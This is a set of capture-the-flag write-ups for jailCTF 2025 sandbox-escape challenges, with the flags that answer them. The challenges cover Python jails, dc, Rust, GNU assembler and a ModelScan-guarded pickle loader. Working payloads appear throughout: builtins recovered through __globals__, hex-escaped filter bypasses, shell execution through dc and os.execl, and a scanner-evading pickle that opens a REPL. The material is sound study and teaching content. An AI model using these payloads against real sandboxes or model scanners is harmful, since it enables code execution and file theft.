# Challenge: sanity 

Category: social / sanity
Author: jailctf org team

Summary:
The flag is embedded in the server rules. The visible message is obfuscated with repeated characters. The rules instruct you to right-click the first message and use Copy Text. That action reveals the hidden flag text.

Key insight:
Discord’s Copy Text copies the raw message contents. Obfuscation intended for humans is preserved when copying. The flag is present in the copied text even if the message looks noisy.

Steps to solve:
Join the Discord server -> Open the rules channel -> Right-click the first message -> Choose Copy Text -> Paste into a text editor -> Scan the pasted content for the flag pattern jail{...}

Flag:
```
jail{welcome_to_jailctf_2025!!!}
```

<img width="1466" height="350" alt="image" src="https://github.com/user-attachments/assets/c9939ebe-9a29-4657-8ef8-16b5e62dca3a" />


<img width="1132" height="528" alt="image" src="https://github.com/user-attachments/assets/d9d5ff1d-dad3-4516-b297-0c795e474a05" />

______

# Challenge: blindness 

Category: pyjail
Author: @helloperson

Problem summary:
__builtins__ is emptied. No print, no open, no helpers.
sys.stdout is closed. Normal output is invisible.
flag is present in the eval scope

Key insight:
Tracebacks and error messages are written to stderr, which is still open. If we cause an exception whose message contains the flag value, the flag will be printed to stderr and thus visible to the attacker.
Exploit:
We need an expression that evaluates flag then causes an exception that includes the evaluated value in its error message. A dictionary lookup fits:

Payload:
{}[flag]
Why this works:

Python evaluates flag to the flag string.
{} is an empty dict. Attempting {}[flag] looks up the flag string as a key.
That raises KeyError: '<flag_string>'. The KeyError message contains the key value quoted.
The traceback is emitted to stderr, so we see the flag even though stdout is closed and builtins are disabled.
Example result (illustrative):
```Traceback (most recent call last):
  File "<string>", line 1, in <module>
KeyError: 'jail{stderr_leak_5fd787f079eb69e}'
```
Alternatives considered:
Causing other exceptions that display values. Many type/index errors do not include the offending value.
Complex attribute/class introspection can work but is unnecessary here. The empty-dict lookup is the simplest and most reliable.
Flag:
`jail{stderr_leak_5fd787f079eb69e}`
<img width="1786" height="328" alt="image" src="https://github.com/user-attachments/assets/e3d3b92b-6d89-4d0e-8592-e4ead8f4ce5b" />
____________
# Challenge: ASMaaSassembly 

Category: pwn / asm
Author: @lydxn

Problem:
The service does not execute shellcode. It only assembles input and prints the resulting bytes as hex. The goal is to exfiltrate flag.txt.

Key insight:
The GNU assembler supports .incbin to embed raw file bytes into the assembled output. The assembler runs in the jail where flag.txt is reachable. The service prints assembled bytes as hex. Embedding the flag directly in the output leaks it.

Exploit:
Send this as input:
`.incbin "flag.txt"`

Server response (hex snippet):
```Compiled shellcode to X86!
6a 61 69 6c 7b 79 65 61 68 5f 6a 75 73 74 5f 69 6e 63 6c 75 64 65 5f 66 6c 61 67 2e 74 78 74 5f 6c 6f 6c 7d 0a
```
Convert the hex to raw bytes then to ASCII:
python3 -c "print(bytes.fromhex('6a 61 69 6c 7b 79 65 61 68 5f 6a 75 73 74 5f 69 6e 63 6c 75 64 65 5f 66 6c 61 67 2e 74 78 74 5f 6c 6f 6c 7d 0a').decode())"
Flag:
`jail{yeah_just_include_flag.txt_lol}`

<img width="2176" height="174" alt="image" src="https://github.com/user-attachments/assets/10ec3891-fc54-4bfe-bdc1-c98c0c35c94d" />

____________

# computer-monitor (pyjail)

## Challenge summary

You’re dropped into a Python REPL-like jail. Whatever you type is `compile`d and then executed **with a sys.monitoring hook that kills the process on any CALL or BRANCH**. Concretely, the jail:

* compiles your input to a code object `code`
* enables monitoring only for `BRANCH` and `CALL` events **on that code object**
* registers a callback `exit_hook = lambda *a: _exit(0)` for both events
* executes your code with `exec(code, {}, {})` 

A local `flag.txt` exists (on remote it holds the real flag). 

## Root cause

Inside `exit_hook`, the name `_exit` is a **global lookup** performed at function runtime. Since monitoring is set **only** for `BRANCH` and `CALL` on your `code` object, you can do operations that are neither a call nor a branch (e.g., attribute/subscript assignments) to **rebind the global `_exit`** in the `__main__` module **before** triggering any monitored event. When the first monitored event fires, the callback tries to run `_exit(0)`—but now `_exit` points to something harmless.
Key details from the jail code: `sm.set_local_events(2, code, sm.events.BRANCH + sm.events.CALL)` and `exit_hook = lambda *a: _exit(0)` followed by `sm.register_callback(..., exit_hook)`. 

## Exploit payload
Minimal one-liner:
```py
import sys; sys.modules['__main__'].__dict__['_exit']=int; print(open('flag.txt').read())
```

Why it works:

* `import sys` + dictionary assignment don’t produce Python **CALL**/**BRANCH** in your code object, so no hook yet.
* You rebind `_exit` in `__main__` to `int` (any callable is fine).
* The first actual call (`open` or `print`) triggers the monitor; it invokes `exit_hook`, which now calls your harmless `_exit` instead of `os._exit`, and execution continues, letting you read the flag. 

## Takeaways

* Python’s `sys.monitoring` hooks here only watch **CALL/BRANCH** on the specific user code object; mutating module globals via attribute/subscript ops slips past.
* Functions resolve globals at **call time**; rebinding those names is a classic way to defang preinstalled callbacks in pyjails that don’t block attribute access. 

running the payload shows this
<img width="2326" height="182" alt="image" src="https://github.com/user-attachments/assets/98a15be8-9533-426d-9d9a-ff4d01ca6d85" />

________________________


# Challenge: calc-defanged
## Category: pyjail
### Author: @quasarobizzaro
Based on: “calc” for iCTF 2024 by maple3142

Problem summary
A “calculator” reads an input string and:

Gate: accepts inputs that start with [0-9+\-*/], length ≤ 75, and rejects spaces/underscores.
Eval: eval(expr) runs under a strict audit hook that calls os._exit on sensitive actions.
Print: after eval returns, the code rebinds the exit it closed over, effectively neutering the hook, then print(result) is called.

Net effect: only the prefix must look like math; after that it’s real Python. And any dangerous action that happens during printing escapes the audit hook.

Key insights
The regex uses a prefix match, not a full match → we can start with 0, and then write arbitrary Python.
The audit hook is active only during eval; it’s disabled before print.
Printing a custom object calls its __repr__/__str__. If those methods call open('flag.txt').read(), the file read happens after the hook is neutered.
Spaces and _ are banned, but we can use:

   
a TAB character in lambda<TAB>s:...
\x5f to build underscores at runtime (\x5f\x5frepr\x5f\x5f).

Exploit
Craft an object whose __repr__ reads the flag; return it as the second element of a tuple so print will call repr:

Payload (≤75 chars, includes a literal TAB after lambda)
0,type('',(),{'\x5f\x5frepr\x5f\x5f':lambda    s:open('flag.txt').read()})()


Why this works
0, satisfies the gate; the rest is arbitrary Python.
We dynamically create a class with __repr__ (no _ characters typed, thanks to \x5f).
Nothing dangerous runs during eval. After eval, the hook is disabled.
print(...) renders the tuple, calling our __repr__, which reads and returns the flag.

Example result:
```
Activating audit hook...
Disabling audit hook...
(0, jail{this_python_ain't_so_scary_anymore_when_defanged_73ef638f5110dc0660d01a})
```

Alternatives considered
Using __str__ instead of __repr__ also works (e.g., returning a bare object and printing it), but the tuple + __repr__ is shorter and reliably triggers during print.
Attribute/object graph tricks or eval-time reads are riskier because the hook is active during eval.

Flag
```jail{this_python_ain't_so_scary_anymore_when_defanged_73ef638f5110dc0660d01a}```
<img width="884" height="147" alt="image" src="https://github.com/user-attachments/assets/efba5b5b-59ef-4efd-abf9-b9659bd55043" />

_____________________

# Challenge: desk-calculator RCE (dc pyjail)

**Category:** pwn / jail
**Author:** (unknown, challs1.pyjail.club)

## Problem

A Python wrapper accepts one line of input and rejects anything that isn’t a letter `A–Z` or `a–y` (lowercase `z` is banned). The program writes the line to `/tmp/code.txt` and runs:

```bash
/usr/bin/dc -f /tmp/code.txt
```

The container is built on `pwn.red/jail`. During build, files land under `/srv/app`, but at runtime the jail exposes them under `/app`. The goal is to read the randomized `flag-*.txt`.

## Key insights

* In **dc**, `!` executes a shell command, and `?` reads **one more line** from stdin and executes it as dc code (a mini “stager”).
* The Python filter blocks punctuation, so we can’t type `?` or `!` directly on the first line.
* dc lets us **synthesize characters**: push a number, turn it into a one-byte string with `a`, then execute it with `x`.
* ASCII `'?'` is 63. Build 63 **mod 256** without digits using base-15 numerals and then `a`/`x`.

## Exploit

1. **First line (letters only) — build and run `?`:**

```
FiCBEax
```

Explanation:

* `F` = the digit 15; `i` sets **ibase** to 15.
* `CBE` (base-15) = 12·15² + 11·15 + 14 = **2879**; 2879 mod 256 = **63** (`'?'`).
* `a` converts 2879 → one-byte string `?`.
* `x` executes that string, so dc now **reads the next line** and executes it (filter no longer applies to that line).

2. **Second line (now punctuation allowed) — spawn shell & read flag:**

```
!pwd; ls -la /app; cat /app/flag-*.txt
```

## Proof

From my session:

<img width="767" height="382" alt="image" src="https://github.com/user-attachments/assets/d10a8d31-42bf-41c1-828f-01a3aced44da" />

## Why this works (dc notes)

* `?` — read one line from stdin and execute as dc code.
* `!` — run the rest of the line via `/bin/sh -c ...`.
* `a` — convert number → one-byte string (low 8 bits).
* `x` — execute top-of-stack string as dc program.
* Lowercase `z` (stack depth) is banned by the filter, but the above sequence doesn’t use it.

## Flag

```
jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}
```

_______

# Challenge: primalpyjail

**Category:** misc / pyjail
**Author:** @oh_word
**Points:** 1337

## Problem

A Python service reads one line and evaluates it with `eval(code, {'__builtins__': {}})`. Before evaluating, it enforces three filters:

1. If `len(code) > 200`, or non-ASCII is present, or the substring **`eta`** appears anywhere ⇒ prints **“Relax”** and exits.
2. It regex-scans the **raw source** with `r"\w+"` and requires **every** word token length to be **prime**. If any token has a non-prime length ⇒ prints **“Nope”** and exits.
3. On pass, `eval` runs with an empty `__builtins__`.

Flag is stored in the same directory as the instance.

## Key insights

* **Prime-token rule hits strings too.** The regex walks the source, so `"flag"` contributes a 4-letter token (not prime) and `'-c'` contributes the one-letter token `c` (not prime).
* **Digits are banned implicitly.** Writing `0` or `1` creates 1-char tokens (not prime).
* **`getattr`/`__getattribute__` are blocked** (either contain `eta` or have non-prime length).
* We can still reach a **real Python function** via `().__reduce_ex__(2)[0]` (the first element is `copyreg.__newobj__`), then take its `__globals__` to recover `__builtins__` and thus `__import__`.
* All dangerous identifiers with non-prime lengths (e.g., `__builtins__`, `__import__`) can be accessed by using **hex-escaped string keys**, so the only visible tokens are like `x5f` (length 3, prime).
* Use booleans and `. __len__()` to avoid digit literals and keep under **200 chars**.

## Exploit

Build a one-liner that:

1. Grabs a Python function from `reduce_ex`
2. Walks to its `__globals__`
3. Indexes `__builtins__` and then `__import__` using hex keys
4. Imports `os` and **execs** `sh -c 'cat *f*'`
5. Hex-escape `-c` and the letter `f` inside the command string to satisfy the prime-token filter

### Final payload

```python
().__reduce_ex__('aa'.__len__())[False].__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').execl('/bin/sh','sh','\x2d\x63','cat *\x66*')
```

**Why it passes the filters**

* Longest risky names (`__builtins__`, `__import__`) are accessed via **hex-escaped keys**, so the regex only sees `xNN` tokens (length 3, prime).
* `False` indexes element 0 of the reduce tuple (avoids the digit `0`).
* The protocol `2` is produced as `'aa'.__len__()` (prime-length tokens only).
* `-c` is `'\x2d\x63'`, and the `f` in `*f*` is `\x66`, so no 1-letter tokens.
* Entire input is ASCII and < 200 chars.

<img width="1091" height="102" alt="image" src="https://github.com/user-attachments/assets/b8352882-930b-4752-a153-6746b06c3af3" />


## Notes / sanity checks (helped during exploitation)

* **Eval is live:**
  `('\x61'.__len__()/('\x61'.__len__()-'\x61'.__len__()))` → `ZeroDivisionError`
* **“Relax” test:**
  `'beta'` → `Relax` (literal `eta` in source)
* **“Nope” tests:**
  `'a'` → `Nope` (1-char word token)
  `'-c'` → `Nope` (token `c`)
  `'\x2d\x63'` → OK (only `x2d`, `x63` seen)

## Takeaways

* Regexing the **raw source** for tokens makes string contents part of the policy surface.
* Removing builtins isn’t enough when there’s any reachable route to a Python **function object**: `.__globals__` is a powerful pivot.
* Small “linguistic” constraints (prime token lengths, banned substrings) can be sidestepped systematically with **hex escapes**, boolean indexing, and dunder gadgetry.

**Flag:** `jail{it_was_prbably_schizophrenia_fad4cea2cfe8}` 

_____

# Challenge: rustjail
## Category: misc / rustjail
### Author: @wishhill
Points: 1337

## Problem

A Python wrapper accepts exactly **one line** of Rust, whitelists characters, compiles it with `rustc`, then runs the produced binary:

```py
allowed = set(string.ascii_lowercase + string.digits + ' :._(){}"')

inp = input("gib cod: ").strip()
if not allowed.issuperset(set(inp)):
    print("bad cod"); exit()

with open("/tmp/cod.rs","w") as f: f.write(inp)
os.system("/usr/local/cargo/bin/rustc /tmp/cod.rs -o /tmp/cod")
os.system("/tmp/cod; echo Exited with status $?")
```

* **Allowed chars:** `a–z 0–9 space : . _ ( ) { } "`
* **Goal:** print the flag stored next to the service (`flag.txt`).

## Key insights

* The filter **blocks** `! # = ; / , '` and uppercase. That kills all classic compile-time tricks:

  * no `include_str!`, `compile_error!`, `include_bytes!`
  * no `#[path="flag.txt"] mod …;`
  * no `println!`
* We therefore need a **runtime** read of `flag.txt`, but also a way to **print** the content **without** macros.
* Rust’s `std::panic::panic_any(T)` is a **function** (not a macro). If we panic with the flag string, `rustc` will compile and the **runtime panic message prints the flag** to stderr.
* Every token we need (`std::fs::read_to_string`, `panic_any`, `unwrap`, `"flag.txt"`) uses only allowed characters.

## Exploit

Make the compiled program read the flag and panic with it:

1. Read the file: `std::fs::read_to_string("flag.txt")`
2. Force the value to exist: `.unwrap()`
3. Print without `println!` by **panicking with the string**: `std::panic::panic_any(...)`

## Final payload

```
fn main(){std::panic::panic_any(std::fs::read_to_string("flag.txt").unwrap())}
```

## Run & result
<img width="820" height="173" alt="image" src="https://github.com/user-attachments/assets/5dfb5165-cda2-46e3-8392-c016e265e48d" />

## Why this passes the filter

* **No banned characters:** uses only lowercase, digits, `: . _ ( ) { } "`.
* **No macros/attributes:** `panic_any` is a normal function, not `panic!` or `println!`.
* **No compile-time include needed:** file is read at runtime via `std::fs`.
* **Printing without `println!`:** the panic handler prints our payload for us.

______

# Challenge: modelscan jailgolfpickle

**Category:** misc / pyjail
**Author:** @quasarobizzaro
**Points:** 1337

---

## Problem

The server reads a hex string, writes **only the first 23 bytes** to `/tmp/malicious.pkl`, scans the file with `ModelScan(settings=DEFAULT_SETTINGS)`, and if no issues are reported it does:

```py
pickle.loads(open('/tmp/malicious.pkl','rb').read())
```

If the scanner flags anything (or errors), it prints `no` and exits.

**Goal:** Execute code and read `flag.txt`.

---

## Key insights

* **23-byte budget.** Our entire pickle must fit in 23 bytes (after hex → bytes). Protocol 0 pickles are the shortest.
* **Scanner is substringy.** It flags raw substrings like `os`, `system`, `pty`, and even `sh` *anywhere* in the 23-byte file.
  (e.g., sending just `sh` → `no`.)
* **Opcodes aren’t banned.** `GLOBAL` / `STACK_GLOBAL` pass; bogus imports yield real `ModuleNotFoundError`, so the scan happens *before* unpickle.
* **Beat the scanner with a REPL.** If we call something harmless-looking (no `os`/`sh`) that drops us into Python, the scanner no longer mediates our keystrokes. Two perfect gadgets:

  * `code.interact()` → interactive console (`>>>`)
  * `pdb.set_trace()` → Pdb prompt (`(Pdb)`), where `!` runs Python

Both fit well under 23 bytes in protocol 0 and avoid blacklisted substrings.

---

## Exploit

### Plan

1. Unpickle a **tiny** payload that calls `code.interact()` (or `pdb.set_trace()`), dodging all banned words.
2. At the prompt, just `print(open("flag.txt").read())`.

### Final payload (hex)

Drop into a Python REPL (`code.interact`) — 22 bytes**

```
63636f64650a696e7465726163740a2874522e
```

Disassembly (protocol 0):

```
c code
interact
( t R .
```

### Usage

<img width="663" height="170" alt="image" src="https://github.com/user-attachments/assets/1799b9d1-8cf5-45f3-903d-9074a3597ecd" />

---

## Why it passes the scan

* **No banned substrings.** Payload bytes don’t contain `os`, `system`, `pty`, or `sh`.
* **Within 23 bytes.** Both payloads survive the truncation intact.
* **Scanner stops at unpickle boundary.** After `code.interact()`/`pdb.set_trace()` starts, your *typed* Python isn’t re-scanned; you can freely open and read files.

---

## Notes / sanity checks that helped

* **Baseline pickles pass:** `4e2e` (`None`), `292e` (empty tuple) → silent success.
* **Truncation is real:** A deliberately 25-byte pickle crashes at unpickle (no `no`), confirming the 23-byte slice.
* **Substring blacklist confirmed:** sending `sh` alone (`7368`) ⇒ `no`.
* **Opcodes allowed:** `GLOBAL 'zz zz'` causes `ModuleNotFoundError: No module named 'zz'` (so scan didn’t block the opcode).

---

## Takeaways

* Signature/substring scanners are brittle; **don’t chase `os.system` golf** when a benign function gives you a REPL.
* With pickles, any reachable callable is a gadget—**REPL/Debugger entries** are superb because they’re short and “safe”-looking.
* Always **size your payload** against the exact byte budget before dealing with filters.

---

## Flag

`jail{they_really_dont_care_bruh_fdf1d09caee6d95c}` 


______
